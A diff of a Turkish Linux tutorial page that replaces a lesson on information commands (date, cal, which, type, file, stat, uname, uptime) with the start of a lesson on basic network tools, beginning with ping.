@@ -3,877 +3,1492 @@ layout: tutorial
 title:  "Ağ Komutları"
 author: Taylan Özgür Bildik
 coursetitle: "Temel Linux Eğitimi"
-excerpt: "Temel ağ komutlarını ele alıyoruz."
-tags: [date , cal , which , type , command , builtin , file , stat , lsb_release , uname , uptime , free , du , lsusb , lspci , lshw]
+excerpt: "Sık kullanılan temel ağ yönetim araçlarından bahsediyoruz."
+tags: [ping, ip, nmtui, ssh, scp, wget, dns, hostname, dhcp, arp, route, traceroute, ss, nc, tmux]
 categories: [temel-linux]
-cover: networkcover.png
+cover: networkcover.webp
 tutorial: 21
 toc: true  
 ---
 
+Bu bölüm içerisinde ağ hakkında çok temel düzeyde bilgi almamızı sağlayan bazı araçlardan bahsedeceğiz. Ancak tabii ki ağ konusu başlı başına öğrenilmesi gereken bir konu olduğu için bu bölümde ağ temellerine değinmeyeceğiz. Eğer network konusunda temel seviye bilginiz yoksa, mevcut platformda ağ temellerine giriş eğitimi mevcut. Bu bölümden önce ağ temellerini öğrenmeniz, bu bölümden alacağınız verimi kesinlikle arttıracaktır. 
 
-Genel olarak sistemdeki tarih takvim araçlar dosyalar ayarlar kayıtlar ve benzeri pek çok yapı hakkında konsol üzerinden kolayca bilgi edinebilmek için kullandığımız komutları, bilgi alma komutları başlığı altında inceleyebiliriz. Dolayısıyla aslında tüm eğitim boyunca kullandığımız ve kullanmaya da devam edeceğimiz pek çok komutu bilgi alma komutları sınıfında değerlendirmemiz mümkün. Çünkü hepsi, kendi görevleri özelinde pek çok bilgi sunma kabiliyetine sahip araçlar. En basit örnek olarak, `ls` komutu bile tek başına kullanıldığında mevcut dizinimizdeki içerikler hakkında bilgi almamızı sağlıyor.
+Ben anlatımlar sırasında ağ temelleri eğitimini bitirdiğinizi ya da halihazırda ağ temellerini bildiğinizi varsayarak açıklamalar yapıyor olacağım. Bu eğitim standart Linux kullanıcılarını da kapsadığı için zaten yalnızca herkesin işine yarayabilecek bazı ağ araçları hakkında çok kısaca bilgi ediniyor olacağız.
 
-Yine de eğitimin geri kalanında değinmek için uygun bölümleri bulunmayan ama haberdar olmamızın faydalı olacağı bazı araçlardan “bilgi alma bölümü” altında çok kısaca bahsetmek istiyorum.
+# ping
 
-Anlatımlarımıza öncelikle takvim ve saat gibi temel bilgileri nasıl edinebileceğimizle başlayabiliriz. 
+`ping` komutu, ağdaki cihazların erişilebilirliğini ve tepki sürelerini kontrol etmek için kullanılan bir araçtır. Temelde, bir cihazdan diğerine küçük kontrol(icmp) paketleri gönderir ve bu paketlerin karşı cihaza ne kadar sürede ulaştığını ve geri döndüğünü ölçer.
 
-# Tarih ve Saat Hakkında Bilgi Edinme
+Hemen denemek için www.google.com adresine ping göndermeyi deneyelim. 
 
-## date Komutu
 
-Eğer grafiksel arayüz kullanıyorsanız zaten mutlaka tarih ve saati kolayca öğrenebileceğiniz bir ortama sahipsinizdir. 
-
-Tarih bilgisini komut satırından edinmek istediğimizdeyse `date` komutunu kullanabiliyoruz. Zaten “date” ifadesi “tarih” anlamına geldiği için hatırlaması kolay bir komut. Hemen komutumuzu girelim.
+<p class="mavi"><strong>ℹ️ Not:</strong> Biz durdurana kadar ping gönderilmeye devam edeceği için bir noktada <kbd>Ctrl</kbd> + <kbd>C</kbd> tuşlaması ile işlemi duraklatmamız gerekiyor.</p>
 
 ```bash
-└─$ date
-Mon Jun 26 02:40:38 PM EDT 2023
-```
-
-Bakın `date` komutu tek başına kullanıldığında gördüğünüz gibi sırasıyla, haftanın gününü, ayı, ayın gününü, saati, saat dilimini ve yılı içeriyor. Yani mevcut bulunduğumuz günün tüm tarihi temel bilgilerini `date` aracıyla öğrenebiliyoruz. Tabii ki aracımızın sağladığı tek bilgi mevcut günümüz de değil. Diğer seçenekleri görmek için `date —help` komutu ile yardım sayfasına bakacak olursanız ne kadar çok seçeneğin bulunduğunu görebilirsiniz. Ancak bu kadar çok seçenek olması gözünüzü korkutmasın, çünkü temelde `date` aracının yalnızca sistem tarihini öğrenmek için kullanıyoruz. Mesela tüm tarih bilgisini değil de yalnızca saat bilgisini almak istersek yardım bilgisinde gözüken `%r` parametresini kullanabiliriz. 
-
-```bash
-└─$ date +%r                                                     
-02:42:24 PM
-```
-
-Bakın yalnızca saat bastırıldı. Benzer şekilde diğer parametreleri kullanarak `date` aracından dilediğiniz formda çıktı alabilirsiniz. Bu özelliğe genellikle kabuk programlamada ihtiyaç duyuyor olsak da artık bildiğinize göre ihtiyaç duyduğunuzda yardım sayfasını açıp tekrar hatırlayıp rahatlıkla kullanabilirsiniz..  
-
-Ayrıca `date` aracı ile tarihi değiştirmemiz de mümkün fakat tarihi değiştirmek için sistem servislerini kullanmak çok daha sağlıklı bir yaklaşım. Lütfen şimdilik buradaki servis kavramına çok takılmayın. İleride servisleri ayrıca ele alacağız. O zaman servisten kastımın ne olduğunu net biçimde anlamış olacaksınız. Şimdilik `date` komutunun bize mevcut tarih bilgisini sunduğunu bilmemiz yeterli.
-
-## cal Komutu
-
-`cal` aracı komut satırımız üzerinden takvim bilgisi sunan basit bir araç. Kimi sistemlerde varsayılan olarak yüklü bulunmasa da aslında çoğu dağıtımda mevcut oluyor. 
-
-Aracın yüklü olup olmadığınız öğrenmek için tek yapmamız gereken konsolumuza `cal` komutunu girmek. 
-
-```bash
-└─$ cal
-Command 'cal' not found, but can be installed with:
-sudo apt install ncal
-Do you want to install it? (N/y)
-```
-
-Bakın böyle bir komut olmadığı, eğer istersek bu araçla ilişkili olan `ncal` paketinin kurulabileceği belirtiliyor. Buradaki komutu “y” ile onaylayarak ya da kendimiz de buradaki `sudo apt install ncal` komutunu girerek kurulumu yapabiliriz. Eğer size bu şekilde sorulmadıysa ve sisteminizde yüklü değilse, debian tabanlı dağıtımınıza kurmak için siz de buradaki komutu kullanabilirsiniz. Ben “y” ile aracın kurulumunu onaylıyorum ve kullanıcı hesabımın parolasını girip kurulumu başlatılıyorum.
-
-```bash
-└─$ cal
-Command 'cal' not found, but can be installed with:
-sudo apt install ncal
-Do you want to install it? (N/y)y
-sudo apt install ncal
-Reading package lists... Done
-Building dependency tree... Done
-Reading state information... Done
-The following NEW packages will be installed:
-  ncal
-0 upgraded, 1 newly installed, 0 to remove and 1830 not upgraded.
-Need to get 19.7 kB of archives.
-After this operation, 59.4 kB of additional disk space will be used.
-Get:1 http://kali.download/kali kali-rolling/main amd64 ncal amd64 12.1.8 [19.7 kB]
-Fetched 19.7 kB in 11s (1,828 B/s)
-Selecting previously unselected package ncal.
-(Reading database ... 291346 files and directories currently installed.)
-Preparing to unpack .../archives/ncal_12.1.8_amd64.deb ...
-Unpacking ncal (12.1.8) ...
-Setting up ncal (12.1.8) ...
-Processing triggers for kali-menu (2021.4.2) ...
-Processing triggers for man-db (2.9.4-4) ...
-```
-
-Şimdi aracımızı çalıştırmak için `cal` komutunu tekrar girelim. 
-
-```bash
-└─$ cal
-     June 2023        
-Su Mo Tu We Th Fr Sa  
-             1  2  3  
- 4  5  6  7  8  9 10  
-11 12 13 14 15 16 17  
-18 19 20 21 22 23 24  
-25 26 27 28 29 30
-```
-
-Bakın mevcut ayın takvim bilgisini sorunsuzca konsola bastırmış olduk. Bu komutun dışında eğer takvimde gün isimlerinin bastırılmasını ve bizim hangi günde olduğumuzun belirtilmesini istersek `ncal` komutunu da kullanabiliriz. 
-
-```bash
-└─$ ncal
-    June 2023         
-Su     4 11 18 25   
-Mo     5 12 19 26   
-Tu     6 13 20 27   
-We     7 14 21 28   
-Th  1  8 15 22 29   
-Fr  2  9 16 23 30   
-Sa  3 10 17 24
-```
-
-Bakın sol tarafta gün isimleri sırasıyla yazıyor. Takvim de bu günlerin sıralamasına uygun şekilde basılmış oldu. 
-
-Eğer mevcut ayı değil de geçmiş ya da gelecek bir tarihten takvim bilgisine bakmak istersek `cal` ya da `ncal` komutunun ardından ay ve yılı belirterek tam istediğimiz tarihteki takvim bilgisine de ulaşabiliriz. Ben örnek olarak **2000** yılının **ocak** ayının takvimini bastırmak üzere `ncal 1 2000` şeklinde komutumu giriyorum. 
-
-```bash
-└─$ ncal 1 2000
-    January 2000      
-Su     2  9 16 23 30
-Mo     3 10 17 24 31
-Tu     4 11 18 25   
-We     5 12 19 26   
-Th     6 13 20 27   
-Fr     7 14 21 28   
-Sa  1  8 15 22 29
-```
-
-Bakın 2000 yılının ocak ayı takvimi getirildi. Benzer şekilde ileri tarih de belirtebiliriz. Ben 2025 yılının 6 ayı için takvim bilgisini istiyorum. 
-
-```bash
-└─$ ncal 6 2025                                                  
-    June 2025         
-Su  1  8 15 22 29   
-Mo  2  9 16 23 30   
-Tu  3 10 17 24      
-We  4 11 18 25      
-Th  5 12 19 26      
-Fr  6 13 20 27      
-Sa  7 14 21 28
-```
-
-Bakın bu takvim de bastırıldı. İşte ihtiyacınız olduğunda sizler de konsol üzerinden takvim bilgisine bu şekilde kolayca ulaşabilirsiniz. Komutun ismi “**cal**endar” yani “takvim” ifadesinden geldiği için hatırlaması da kolay aslında. Yine de unutursanız örneğin yardım sayfalarını `apropos calendar` komutu ile kurcalayabilirsiniz mesela. 
-
-```bash
-└─$ apropos calendar
-cal (1)              - displays a calendar and the date of Easter
-ncal (1)             - displays a calendar and the date of Easter
-zshcalsys (1)        - zsh calendar system
-```
-
-Bakın takvimle ilgili olan komutlar ve açıklamaları listelendi.
-
-Neticede takvimi öğrenebileceğimiz bir komut olduğunu bildiğimiz sürece, ilgili komutun ismini bulmak için yardım sayfalarını kolayca kullanabiliyoruz gördüğünüz gibi.
-
-# Dosyalar Hakkında Bilgi Edinmek
-
-## which Komutu
-
-`which` komutunu, çalıştırdığımız araçların dosya konumlarını öğrenmek için kullanabiliyoruz.  
-
-Örneğin sizler de biliyorsunuz ki; ben konsola `ls` yazdığımda kabuk öncelikle `ls` isminde bir yerleşik komutu var mı diye bakıyor, eğer yoksa PATH yolu üzerinde bu isimde bir dosya var mı diye araştırmaya giriyor ve eğer bulabilirse bu dosyayı çalıştırıyor. Zaten bu durumdan eğitimin en başında bahsettik. İşte bash komutunun bulup çalıştırmasına benzer şekilde, `which` komutu da kendisine argüman olarak belirtilmiş olan isimdeki aracın tam dosya konumunu bize bildiriyor. Yani aslında `which` komutu da PATH yoluna bakarak argüman olarak verdiğim aracı araştırıyor. Dolayısıyla PATH yolunda olmayan araçların dosya konumları `which` komutu tarafından bastırılamıyor. 
-
-Hemen `ls` komutunun tam dizin adresine bakalım. 
-
-```bash
-└─$ which ls
-/usr/bin/ls
-```
-
-Bakın `ls` aracı tam olarak ***/usr/bin/ls*** dizini içindeymiş. hatta istersek `which` aracının kendi dosya adresine de bakabiliriz. 
-
-```bash
-└─$ which which
-/usr/bin/which
-```
-
-Bakın `which` aracı da ***/usr/bin/which*** dizini içindeymiş. İşte bu şekilde PATH yolu üzerindeki araçların tam dizin adreslerini öğrenebilirsiniz. Bu komut özellikle bir aracın çalıştırılabilmesi için tam dizin adresinin girilmesi gereken durumlarda bize dizin bilgisini sunması bakımından önemli. Örneğin eğer hatırlıyorsanız, varsayılan kabuğumuzu bash olarak değiştirme işleminden bahsederken, bash kabuğunun dosya konumunu da `which` komutu sayesinde bulmuştuk. `which` komutu, özellikle bash kabuk programlamada sıklıkla kullanıldığı için, ileride karşılaşmanız ve ihtiyaç duymanız olası. Yani hemen şimdi aktif olarak kullanmayacak olsanız bile bu komutu gördüğünüzde hangi amaca hizmet ettiğini artık biliyorsunuz.
-
-## type Komutu | command & builtin Komutları
-
-`type` komutu, isminden de anlaşılabileceği gibi kabuğa girdiğimiz komutların tipiyle türleriyle ilgili bilgileri görüntülemek için kullandığımız bir araçtır. Diğer bir deyişle kabuğa verdiğiniz komutların kabuk tarafından nasıl algılandığını görmenizi sağlıyor. Bu komut özellikle sistemde yüklü bulunan araçların isimleri ile aynı isimde takma isimler yani **alias** tanımlandığında, kabuğun bizim girdiğimiz komutu nasıl gördüğünü anlamak için kullanışlı bir bilgi edinme aracıdır.
-
-Ben denemek için konsola `type ls` yazıyorum. 
-
-```bash
-└─$ type ls
-ls is aliased to `ls --color=auto'
-```
-
-Bakın kabuğa `ls` komutunu verdiğimde aslında kabuğun `ls` komutunu bir takma isim olarak kabul edip buradaki komutu çalıştırdığını öğrendik. Normalde standart `ls` aracı yani biz `ls` komutunu girdiğimizde çalıştırılan dosya ***/usr/bin/ls*** dosyası. Ama `ls` komutu ile aynı isimde yeni bir takma isim tanımlandığı için kabuk bizim girdiğimiz `ls` komutunu öncelikli olarak takma isim olarak dikkate alıyor ve buradaki takma isim tanımlamasından dolayı `ls —color=auto` komutunu çalıştırıyor.
-
-Takma isim dışında kabuğun yerleşik komutlarını da sorgulayabiliriz. 
-
-```bash
-└─$ type cd
-cd is a shell builtin
-```
-
-Bakın `cd` aracı bash kabuğunun yerleşik aracı olduğu için bu çıktıyı almış olduk.
-
-Ayrıca mesela `type bash` komutunu da girebiliriz. 
-
-```bash
-└─$ type bash
-bash is /usr/bin/bash
-```
-
-Bakın bu kez bash kabuğunun dosya konumunu aldık çünkü biz `bash` komutunu girdiğimizde mevcut kabuk bu dizindeki dosyayı çalıştırıyormuş. Bash kabuğu yerleşik bir araç olmadığı için veya bu isimde bir takma isim tanımlanmadığı için bu şekilde doğrudan çalıştırılan dosyanın konumu kabuk tarafından kullanılıyor.
-
-Özetle bakın `type` komutu sayesinde bizim girdiğimiz komutlardaki araç isimlerinin kabuk tarafından nasıl algılandığını öğrenebiliyoruz. 
-
-Peki bizim girdiğimiz komutların kabuk tarafından nasıl algılandığının neden bilmemiz gerekiyor ? 
-
-Bu bilgi önemli çünkü, tıpkı `ls` komutunda olduğu gibi yerleşik ve PATH yolundaki harici komutlarla aynı isimde takma isimler tanımlı olabiliyor. Takma isimler yerleşik ve harici komutlardan daha öncelikli değerlendirildiği için de, girdiğimiz komutlar bizim normalde beklediğimizden daha farklı sonuçlar verebiliyor.
-
-Örneğin ben `alias ls="echo ben takma isimim"` şeklinde yani var olan bir komutla aynı isimde bir takma isim tanımlarsam ne olur ? Hemen deneyelim. 
-
-```bash
-└─$ alias ls="echo ben takma isimim"
-
-┌──(taylan@linuxdersleri)-[~]
-└─$ ls                                                           
-ben takma isimim
-```
-
-Gördüğünüz gibi `ls` komutunun neticesinde dizin içeriğini listelemek yerine "ben takma isimim" çıktısını aldık. Çünkü kabuğa girdiğimiz komutlarda ilk olarak eğer komutla eşleşen bir takma isim varsa kabuk bunu dikkate alıyor. Nitekim çıktıdan da bu durumu teyit ettik. İşte girdiğimiz komutun beklediğimizden farklı sonuçlar verdiği durumlarda `type` komutu ile kabuğun bakış açısından girdiğimiz komutu sorgulayabiliyoruz. Bu sayede girdiğimiz komutun neden beklenmedik şekilde çalıştığına dair çözüm için fikir sahibi olmamız mümkün oluyor. 
-
-Örneğin benim `ls` takma ismi örneğinde komutumu `command ls` şeklinde girmem gerekiyor. 
-
-```bash
-└─$ command ls                                                   
- abc         harf.txt           liste3            sehir
-```
-
-Bakın bu şekilde girdiğimde, `ls` ifadesinin bir komut olduğunu belirtmiş oluyorum. Benim burada kullandığım `command` komutu sayesinde kabuk takma ismi görmezden gelip normla şekilde önce yerleşik komutlara daha sonra `ls` isminin geçtiği PATH yolundaki dizinlere bakıyor ve ***/usr/bin/ls*** dosyasını bulup çalıştırabiliyor. Yani buradaki `command` komutu `ls` komutunun doğrudan çalıştırılacak komut olarak kabul edilmesini sağlıyor.
-
-Aynı durum yerleşik komutlar için de geçerli. Örneğin `cd` yerleşik komutu ile aynı isimde bir `alias` tanımlarsak `cd` komutunu kullandığımızda takma ismin karşılığındaki komut çalıştırılıyor olacak. Denemek için `alias cd=”echo ben cd komutuyum”` şeklinde yazıp onaylayalım. 
-
-```bash
-└─$ alias cd="echo ben cd komutuyum"                             
-
-┌──(taylan@linuxdersleri)-[~]
-└─$ cd                                                           
-ben cd komutuyum
-
-┌──(taylan@linuxdersleri)-[~]
-└─$ cd /                                                         
-ben cd komutuyum /
-```
-
-Bakın `cd` komutu asıl işlevi olan dizin geçişi işlemi yerine bizim tanımladığımız takma ismi kullanılıp konsol çıktı bastırılıyor. Hatta `type cd` komutu ile de teyit edebiliriz. 
-
-```bash
-└─$ type cd
-cd is aliased to `echo ben cd komutuyum'
-```
-
-Bakın `cd` komutu kabuk tarafından artık bir takma isim olarak algılanıyormuş.
-
-Eğer biz bu takma isim yerine `command cd  /` veya `builtin cd /` şeklinde yazarsak, kabuk buradaki `cd` ifadesini ile tanımlı olan takma ismi görmezden gelip `cd` komutunun asıl işlevini yerine getiriyor olacak. 
-
-```bash
-└─$ command cd /                                                 
-
-┌──(taylan@linuxdersleri)-[/]
-└─$ builtin cd ~
-
-┌──(taylan@linuxdersleri)-[~]
-└─$ pwd                                                          
-/home/taylan
-```
-
-Bakın bu kez `cd` aracı yerleşik komutlar içinde bulunduğu için kök dizine sorunsuzca geçiş yaptık. Girdiğimiz komutun bir yerleşik komut olduğunu özellikle belirtmek için `builtin` komutunu da kullanabileceğimizi görmüş olduk.
-
-Fakat dikkat edin `builtin` komutu yalnızca yerleşik komutları niteliyorken, `command` komutu tüm komut türlerinde takma isimlerin görmezden gelinmesini sağlıyor.
-
-Bu durumu test etmek için yerleşik komut olmayan `ls` komutunu `builtin ls` komutu ile doğrudan çalıştırmayı deneyebiliriz. 
-
-```bash
-└─$ builtin ls                                                   
-bash: builtin: ls: not a shell builtin
-```
-
-Bakın `ls` aracının bash kabuğunun yerleşik aracı olmadığı konusunda hata çıktısı bastırıldı. 
-
-Takma ismin görmezden gelinmesi için `command ls` şeklinde girebiliriz. 
-
-```bash
-└─$ command ls                                                   
- abc         harf.txt           liste3            sehir
-```
-
-Bakın bu kez `ls` aracı için takma isim görmezden gelinip bu isim doğrudan PATH yolundaki ilgili dosyayı çalıştırmış oldu.
-
-Sanırım bu örneklerle birlikte, neden `type` komutunu kullanma ihtiyacı duyabileceğimiz ve kabuğun bizim girdiğimiz komutlara bakış açısı hakkında temel düzeyde de olsa fikir sahibi olabildik.
-
-`type` komutu hakkında dikkat etmeniz gereken detay, `type` aracının bütüncül olarak girdiğiniz çok argümanlı komutları değerlendirmek için kullanılmadığı. Yalnızca çalıştırılacak olan araçları temsil eden komutların kabuk tarafından nasıl ele alındığını görmemizi sağlıyor.
-
-Yani örneğin `ls` komutunun `-l` seçeneğiyle birlikte bu komutun tipini sorgulamaya çalışabiliriz.
-
-```bash
-└─$ command ls                                                   
- abc         harf.txt           liste3            sehir
-```
-
-Bakın `ls` komutunun takma isim olduğu ama `-l` ifadesinin bulunamadığı belirtilmiş. Tırnak içinde yazmayı da deneyebiliriz. 
-
-```bash
-└─$ type "ls -l"                                                 
-bash: type: ls -l: not found
-
-└─$ type 'ls -l'
-bash: type: ls -l: not found
-```
-
-Bakın bu kez de `ls -l` komutunun bulunamadığı hatasını aldık.
-
-Yani bizzat buradaki örnekler üzerinden de teyit ettiğimiz gibi buradaki `type` aracı yalnızca ona verdiğimiz argümanlardaki araç isimlerin kabuk tarafından nasıl ele alınıp çalıştırılacağı konusunda bilgi sunuyor. Mesela `type ls echo cd nano` şeklinde birden fazla argüman verip, birden fazla aracı temsil eden komutların kabuk tarafından nasıl ele alındığını görebiliriz. 
-
-```bash
-└─$ type ls echo cd nano                                         
-ls is aliased to `echo ben takma isimim'
-echo is a shell builtin
-cd is aliased to `echo ben cd komutuyum'
-nano is /usr/bin/nano
-```
-
-Bakın bu komutlar kabuk tarafından çalıştırılırken buradaki tipleri dahilinde ele alınıp çalıştırılıyorlarmış.
-
-En nihayetinde `type` komutunun bizlere kabuğun bakış açısından komutları görebilme imkanı tanıdığı görmüş olduk. Artık ihtiyacınız olduğunda komutların kabuktaki tip karşılığını nasıl öğrenebileceğinizi biliyorsunuz.
-
-## file Komutu
-
-`file` aracını dosyaların türleri hakkında bilgi almak için kullanabiliyoruz.
-
-Özellikle dosya uzantısı bulunmayan ve türünü bilmediğimiz dosyalar hakkında hızlıca bilgi edinmek için file aracı iyi bir tercih. Daha önce sıkıştırmış olduğumuz arşiv dosyasının türünden emin olmak için kullanmıştık hatırlıyorsanız. Tekrar hatırlayacak olursak örneğin `file ~/.bashrc` komutu ile ***.bashrc*** dosyasının türünü sorgulayabiliriz. 
-
-```bash
-└─$ file ~/.bashrc
-/home/taylan/.bashrc: Unicode text, UTF-8 text
-```
-
-Bakın bu dosya aslında “text” dosyasıymış.
-
-Başka bir örnek olarak arşiv dosyasını sorgulayabilirim. 
-
-```bash
-└─$ file /var/log/user.log.4.gz 
-/var/log/user.log.4.gz: gzip compressed data, last modified: Sat Jun  3 07:27:18 2023, from Unix, original size modulo 2^32 113312
-```
-
-Bakın bu arşiv dosyasının, hangi tür arşiv olduğu burada kısaca belirtiliyor. Bu şekilde istediğiniz dosyaları sorgulayıp türleri hakkında bilgi alabilirsiniz. Tek tek tüm dosyalar üzerinde denememize gerek yok. `file` aracına argüman olarak belirttiğiniz dosyalar hakkında bu şekilde kısa bilgi alabiliyoruz. Eğer aldığınız çıktıdaki dosya türünü bilmiyorsanız internet üzerinde araştırıp gerekli bilgiye ulaşabilirsiniz.
-
-Son bir örnek olarak sistemde yüklü bulunan araçların dosyalarını da sorgulayabiliriz. Ben `file /usr/bin/ls` komutu ile `ls` aracının dosya türünü sorguluyorum. 
-
-```bash
-└─$ file /usr/bin/ls                                             
-/usr/bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6e3da6f0bc36b6398b8651bbc2e08831a21a90da, for GNU/Linux 3.2.0, stripped
-```
-
-Gördüğünüz gibi tür olarak “**ELF”** basıldı. Bu kısaltma “**E**xecutable and **L**inkable **F**ormat” ifadesinin kısalmasıdır. En genel hali ile yürütülebilir dosyaları temsil ediyor. İşte tıpkı sorguladıklarımız gibi, sistem üzerinde pek çok farklı türde dosya bulunuyor. `file` komutu sayesinde de gerektiğinde dosyaların türleri hakkında bilgi edinebiliyoruz. 
-
-## stat Komutu
-
-Şimdiye kadar `ls` komutu ile boyut tarih ve isim gibi kriterlere göre filtreleme yaparken bizzat gördüğümüz gibi sistemimizdeki dosya ve klasörlerin kendine ait "isim" "boyut" "dizin adresi" "erişim yetkileri" ve “türü” gibi pek çok öznitelik detayını temsil eden metaverileri bulunuyor. `stat` komutu da dosya veya klasörlerin sahip olduğu öznitelikler yani metaveriler hakkında detaylı bilgi sunan bir komuttur. 
-
-Ben denemek için `touch yeni-dosya` komutuyla yeni bir dosya oluşturup stat komutu ile bu dosyanın metaverilerini kontrol etmek istiyorum. 
-
-```bash
-└─$ touch yeni-dosya
-
-└─$ stat yeni-dosya
-  File: yeni-dosya
-  Size: 0               Blocks: 0          IO Block: 4096   regular empty file
-Device: 801h/2049d      Inode: 2893118     Links: 1
-Access: (0644/-rw-r--r--)  Uid: ( 1000/    taylan)   Gid: ( 1000/    taylan)
-Access: 2023-06-27 02:05:22.675485267 -0400
-Modify: 2023-06-27 02:05:22.675485267 -0400
-Change: 2023-06-27 02:05:22.675485267 -0400
- Birth: 2023-06-27 02:05:22.675485267 -0400
-```
-
-Bakın dosyayla ilgili pek çok detay konsolumuza bastırıldı.
-
-Dosyanın tam ismi, boyutu ve dosya tipi gibi detaylar burada gözüküyor. Örneğin bu dosya içerisi boş standart bir dosya olduğu için “regular empty file” şeklinde çıktı aldık.  
-
-Bunun dışında daha önceki anlatımlarımızda kısaca ele aldığımız “inode” ve “link” bilgisi de burada açıkça belirtiliyor. Buradaki **links**, bu dosyanın **sahip olduğu katı linkleri** temsil ederken, **inode** değeri **diskteki veriye ulaşmayı sağlayan benzersiz index numarasını** belirtiyor. 
-
-Dosyanın erişim izinlerini ve sahiplik bilgilerini de buradan görebiliyoruz. Burası dosyanın yetkilerini, sahibini ve grubunu bize bildiriyor. Erişim yetkilerinden ileride ayrıca bahsediyor olacağız. 
-
-Ayrıca bakın burada dosyanın en son “erişim”, “düzenleme” ve “değişim” tarihleri detaylı şekilde basılmış. Biz dosyayı yeni oluşturduğumuz için hepsi aynı oldu ama aslında:
-
-**Erişim tarihi;** dosyanın en son erişilen tarihi belirtiyor. Örneğin dosyanın okunması veya çalıştırılması gibi bir erişim.
-
-**Düzenleme tarihi;** dosya içeriğinin en son ne zaman değiştirildiğini belirtiyor. 
-
-**Değişim tarihi;** dosyanın meta verilerinin en son ne zaman değiştirildiğini belirtiyor. Örneğin dosyanın ismi değiştirildiyse bu tarih de değişecektir. 
-
-Ayrıca bakın “birth” yani dosyanın ilk oluşturulduğu ile ilgili bir satır daha bulunuyor. 
-
-Neticede gördüğünüz gibi `stat` komutu sayesinde dosyaların meta verilerini detaylı şekilde görüntüleyebiliyoruz. 
-
-# Sistem Hakkında Genel Bilgi Edinmek
-
-## lsb_release
-
-`lsb_release` komutu sayesinde mevcut dağıtım hakkında çeşitli bilgiler edinebiliyoruz. Komutumuzda yer alan “**lsb**” ifadesi “**L**inux **S**tandard **B**ase” ifadesinin kısalmasından geliyor. Linux Standard Base kısaca (LSB), Linux sistem yapısını standartlaştırmak için Linux Vakfı'nın organizasyon yapısı altında yürütülen bir projedir. LSB' projesinin en temel amacı, Linux dağıtımları arasındaki uyumluluğu sağlamak için bir dizi açık standart geliştirmek ve bunların kullanımını teşvik etmektir. İşte biz de `lsb_release` komutu ile mevcut dağıtımımızın bu standartlar dahilindeki ismi ve sürümü gibi detayları öğrenebiliyoruz. Tüm bilgileri listelemek için `lsb_release -a` komutunu kullanabiliriz. 
-
-```bash
-└─$ lsb_release -a                                               
-No LSB modules are available.
-Distributor ID: Kali
-Description:    Kali GNU/Linux Rolling
-Release:        2022.1
-Codename:       kali-rolling
-```
-
-Bakın çıktılarda, dağıtıcı kimliği, kullandığım dağıtım, sürümü, kodadı gibi detaylar bastırıldı. Bu bilgiler mevcut dağıtım hakkında standart düzende bilgiler sunuyor. Buradaki bilgiler sayesinde mevcut dağıtımın tam olarak hangi sürüm olduğunu anlayabiliyorum.
-
-Aldığımız çıktının başındaki “lsb modülü bulunamadı” hatasına takılmayın. Bu hata `lsb_release` aracının kurulu olduğu ama çekirdek modülünün kurulu olmadığını söylüyor. Şart değil ama dilerseniz lsb çekirdek modülünü nasıl kurabileceğinizi araştırıp kolayca kurulum yapabilirsiniz.
-
-Ayrıca `lsb_release —help` komutu ile yardım bilgilerinde de görebileceğiniz gibi aslında yalnızca -a seçeneği yok. Çeşitli bilgileri ayrı ayrı bastırmamızı sağlayan farklı seçenekler de var. Eğer kabuk programlama sırasında bu bilgilere ayrı ayrı ihtiyacınız olan bir durumla karşılaşırsanız kullanabilirsiniz. Bunun dışında ben yalnızca gerektiğinde mevcut dağıtım bilgisini edinmek için `lsb_release -a` komutunu kullanıyorum.
-
-## uname
-
-`uname` komutu mevcut işletim sistemi ve donanımı hakkında temel bilgiler sağlayan komuttur. Tüm temel bilgilerin hepsini tek seferde öğrenmek için `-a` seçeneğiyle birlikte kullanabiliyoruz. 
-
-```bash
-└─$ uname -a
-Linux kali 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 (2022-01-31) x86_64 GNU/Linux
-```
-
-Buradaki çıktılara bakarak sırasıyla; çekirdek adını, hostname bilgisini yani mevcut cihazımızın ağ üzerinden iletişim kurarken kullandığı adı, sistemin çekirdek sürümünü, tam çekirdek versiyonunu, makinenin donanım mimarisini ve son olarak da işletim sisteminin adını öğrenebiliyoruz.
-
-Mevcut bulunduğumuz sistemi tanımak için yeteri kadar bilgi burada sunuluyor.
-
-Ayrıca isterseniz tek seferde bastırdığımız tüm bu bilgileri ayrı ayrı da bastırabilirsiniz. Seçenekleri görmek için `uname —help` komutunu kullanabilirsiniz. Neticede gördüğünüz gibi `uname` komutu üzerinden mevcut sistemimiz hakkında kolayca bilgi  edinebiliyoruz.
-
-## uptime Komutu
-
-`uptime` ifadesi Türkçe olarak “çalışma süresi” anlamına geliyor. 
-
-Adından da anlaşılabileceği gibi `uptime` aracı, sistemin ne kadar süredir çalıştığı konusunda bilgi almamızı sağlayan bir araç. Hemen komutumuzu girip sonuçları üzerinden konuşalım.
-
- 
-
-```bash
-└─$ uptime
- 02:16:40 up 19 min,  1 user,  load average: 0.06, 0.07, 0.09
-```
-
-`uptime` komutunu tek başına seçenek belirtilmeden kullandığımızda sırasıyla; 
-
-mevcut sistem saatini ,
-
-sistemin ne kadar süredir açık olduğunu,
-
-mevcut sistemde açık olan kullanıcı oturumu sayısı
-
-ve son 1, 5 ve 15 dakikanın sistem yük ortalamalarını veriyor.
-
-Buradaki yük ortalaması, sistemin 1 5 ve 15 dakikalık son periyottaki meşguliyetini ifade ediyor. Bu çıktılarda sizin sisteminizde yakın zamanda yani son 15 dakikadan son 1 dakikaya doğru yük miktarın arttığı görülüyorsa sistem yükünün artmakta olduğunu düşünebilirsiniz. 
-
-Şu anda benim sistemin yük altında olmadığı için yani çoğunlukla bekleme modunda olduğu için buradaki değerler sıfıra yakın gözüküyor. Örneğin yük durumunu gözlemlemek `echo {1..999999}` şeklinde komutumuzu girip sistemi suni olarak biraz daha yük altında bırakabiliriz. 
-
-```bash
-└─$ echo {1..9999999}
-1 2 3 4 5 5 ....
-...
-..
-
-└─$ uptime                                                       
- 02:19:35 up 22 min,  1 user,  load average: 0.13, 0.09, 0.09
-```
-
-Bakın yakın zamandaki yük oranı uzak zamana göre artış gösteriyor. Bu çıktı bize, yakın zamanda sistemin daha fazla yük altına girdiğini haber veriyor. 
-
